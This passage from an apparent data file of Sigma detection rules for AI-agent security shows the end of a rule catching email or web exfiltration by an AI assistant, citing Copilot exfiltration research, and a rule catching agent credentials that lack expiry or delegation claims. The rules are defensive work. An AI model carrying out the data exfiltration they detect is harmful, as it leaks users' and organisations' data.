      "  condition: email_exfil or web_exfil",
    ].join("\n"),
    reference:
      "Bargury, BlackHat USA 2024 \u2014 'Living off Microsoft Copilot' \u2014 and embracethered.com Copilot exfil writeups",
    knownFp:
      "Sales agents legitimately emailing external domains. Maintain allowlists per agent purpose, not one global list.",
  },
  {
    id: "DE.AGENT.LONGLIVED.SECRET",
    lab: "agent-identity",
    title: "Agent presents long-lived static credential (no exp / no act)",
    severity: "high",
    rationale:
      "Most agent platforms ship with API keys in config. Token without an exp claim, or without an act claim when called user-on-behalf-of, breaks attribution and replay defence. Drift surface.",
    dataSource:
      "Resource-server access logs (the API the agent calls). Your IdP's emitted-token catalog if you mint short-lived tokens centrally.",
    attack:
      "RFC 8693 \u00a71.2 / NIST SP 800-63-4 (NPE treatment) / OWASP LLM06 (Insecure Plugin Design)",
    sigma: [
      "title: Agent token missing exp or act when delegated",
      "logsource:",
      "  product: api-gateway",
      "  service: auth",
      "detection:",
      "  no_exp:",
      "    auth.jwt.exp: null",
      "  delegated_no_act:",
      "    auth.jwt.is_agent: true",
      "    auth.jwt.act.sub: null",
      "  condition: no_exp or delegated_no_act",
    ].join("\n"),
    reference:
      "https://www.rfc-editor.org/rfc/rfc8693 \u00a74.1 (act claim) \u2014 SPIFFE workload identity",
    knownFp:
      "Health-check tokens for synthetic monitors. Tag and exempt by issuer + subject.",
  },
];
